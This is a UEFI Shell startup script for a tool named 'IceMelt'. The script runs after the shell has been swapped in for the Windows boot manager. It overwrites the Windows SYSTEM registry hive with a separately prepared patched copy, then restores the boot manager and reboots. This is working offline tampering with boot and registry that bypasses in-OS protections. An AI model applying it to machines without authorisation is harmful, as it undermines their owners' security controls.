# IceMelt!  —  runs from ESP as the replacement bootmgfw.efi chain
# Layout on ESP (FAT32):
#   \EFI\Microsoft\Boot\bootmgfw.efi   = UEFI Shell (renamed)
#   \EFI\Microsoft\Boot\startup.nsh    = this script (auto-run: shell's own dir)
#   \EFI\IceMelt\ntfs-3g.efi           = NTFS driver
#   \EFI\IceMelt\SYSTEM                = patched SYSTEM hive (produced by: icemelt --deploy-esp)
#   \EFI\IceMelt\bootmgfw-original.efi = pristine bootmgfw (backed up on first deploy)
@echo -off

# --- 1. Locate the ESP by our marker (FAT volumes are already mapped at boot) ---
for %n run (0 10)
    if exist fs%n:\EFI\IceMelt\ntfs-3g.efi then
        set -v EspFs fs%n:
        goto EspFound
    endif
endfor

:EspFound
if x%EspFs% == x then
    echo IceMelt: ESP not found, aborting
    exit /b 1
endif

# --- 2. Load NTFS driver, bind, remap (map -r renumbers everything!) ---
# load may error if the driver is already loaded; that is fine, do not check lasterror here
load %EspFs%\EFI\IceMelt\ntfs-3g.efi
connect -r > NUL
map -r > NUL

# --- 3. Re-detect ESP (mapping numbers may have changed) and find Windows volume ---
set -d EspFs
for %n run (0 10)
    if x%EspFs% == x then
        if exist fs%n:\EFI\IceMelt\ntfs-3g.efi then
            set -v EspFs fs%n:
        endif
    endif
    if x%WinFs% == x then
        if exist fs%n:\Windows\System32\ntoskrnl.exe then
            if exist fs%n:\Windows\System32\config\SYSTEM then
                set -v WinFs fs%n:
            endif
        endif
    endif
endfor

if x%EspFs% == x then
    echo IceMelt: ESP lost after map -r, aborting
    exit /b 1
endif
if x%WinFs% == x then
    echo IceMelt: no Windows system volume found (encrypted or missing)
    exit /b 1
endif

echo IceMelt: ESP = %EspFs%, Windows volume = %WinFs%

# --- 4. Back up the original SYSTEM hive exactly once ---
if not exist %WinFs%\Windows\System32\config\SYSTEM.Original then
    cp %WinFs%\Windows\System32\config\SYSTEM %WinFs%\Windows\System32\config\SYSTEM.Original
    if %lasterror% ne 0 then
        echo IceMelt: SYSTEM backup failed: %lasterror%
        exit /b 1
    endif
endif

# --- 5. Overwrite SYSTEM with the patched hive ---
attrib -r %WinFs%\Windows\System32\config\SYSTEM
cp %EspFs%\EFI\IceMelt\SYSTEM %WinFs%\Windows\System32\config\SYSTEM
if %lasterror% ne 0 then
    echo IceMelt: patched SYSTEM copy failed: %lasterror%
    cp %WinFs%\Windows\System32\config\SYSTEM.Original %WinFs%\Windows\System32\config\SYSTEM
    echo IceMelt: original SYSTEM restored
    exit /b 1
endif

# --- 6. Restore the real bootmgfw so next boot goes straight into Windows ---
if exist %EspFs%\EFI\IceMelt\bootmgfw-original.efi then
    attrib -r %EspFs%\EFI\Microsoft\Boot\bootmgfw.efi
    cp %EspFs%\EFI\IceMelt\bootmgfw-original.efi %EspFs%\EFI\Microsoft\Boot\bootmgfw.efi
    if %lasterror% ne 0 then
        echo IceMelt: WARNING: bootmgfw restore failed, shell will run again next boot
    endif
else
    echo IceMelt: WARNING: bootmgfw-original.efi missing, keeping shell as bootmgfw
endif

echo IceMelt: done, rebooting
stall 5000000
reset -c
